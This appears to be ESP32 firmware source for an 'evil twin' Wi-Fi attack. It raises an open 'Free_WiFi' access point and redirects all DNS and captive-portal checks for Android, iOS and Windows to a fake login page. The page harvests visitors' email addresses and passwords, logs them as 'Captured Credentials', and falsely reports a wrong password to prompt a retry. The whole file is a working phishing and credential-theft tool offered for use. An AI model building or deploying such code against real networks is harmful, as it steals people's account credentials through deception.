#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "./globals.h"

#define DNS_PORT 53

// === Fake AP Credentials ===
const char* fakeSSID = "Free_WiFi";
const char* fakePassword = "";

// === Networking ===
IPAddress apIP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

// === Web and DNS Server ===
DNSServer dnsServer;

// === Credential Storage ===
String ssid = "", pass = "";
bool capnew = false, showcap = false;

// === HTML Pages ===
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html><head><meta http-equiv='refresh' content='0;url=/fake-login'></head>
<body><h2>Redirecting...</h2></body></html>
)rawliteral";

const char* fakeLoginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Login</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; }
    form { max-width: 300px; margin: auto; background: #fff; padding: 20px;
           border-radius: 10px; box-shadow: 0 0 10px #0001; }
    input, button { width: 100%; padding: 10px; margin: 10px 0;
                    border-radius: 5px; border: 1px solid #ccc; }
    button { background: #007BFF; color: white; border: none; cursor: pointer; }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <h2>Wi-Fi Login</h2>
  <form action="/login" method="POST">
    <input type="email" name="email" placeholder="Enter your email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>
)rawliteral";

void initEvilTwin() {
  WiFi.softAP(fakeSSID, fakePassword);
  WiFi.softAPConfig(apIP, gateway, subnet);

  Serial.println("[+] Fake AP Started: " + String(fakeSSID));
  Serial.println("[+] IP Address: " + WiFi.softAPIP().toString());

  dnsServer.start(DNS_PORT, "*", apIP);

  // === Captive Portal Routes ===
  auto redirectToLogin = []() {
    server.sendHeader("Location", "/login-page", true);
    server.send(302, "text/plain", "");
  };

  server.on("/generate_204", HTTP_GET, redirectToLogin);       // Android
  server.on("/hotspot-detect.html", HTTP_GET, redirectToLogin); // iOS
  server.on("/ncsi.txt", HTTP_GET, redirectToLogin);            // Windows
  server.on("/connecttest.txt", HTTP_GET, redirectToLogin);     // Samsung
  server.on("/wpad.dat", HTTP_GET, redirectToLogin);            // Generic
  server.on("/login.html", HTTP_GET, redirectToLogin);          // Fallback

  // === Login Page ===
  server.on("/login-page", HTTP_GET, []() {
    server.send(200, "text/html", fakeLoginPage);
  });

  // === Capture Credentials ===
  server.on("/login", HTTP_POST, []() {
    if (server.hasArg("email") && server.hasArg("password")) {
      ssid = server.arg("email");
      pass = server.arg("password");
      capnew = true;
      showcap = true;

      Serial.println("[!] Captured Credentials:");
      Serial.println("Email: " + ssid);
      Serial.println("Password: " + pass);

      server.send(200, "text/html", "<h2>Connection Failed!</h2><p>Wrong password. Try again.</p>");
    } else {
      server.send(400, "text/plain", "Missing form fields");
    }
  });

  // === Redirect All Other Requests ===
  server.onNotFound(redirectToLogin);

  server.begin();
}

void processEvilTwinDNS() {
  dnsServer.processNextRequest();
}

void handleDNS() {
  processEvilTwinDNS();
}

void startEvilTwin() {
  initEvilTwin();
}
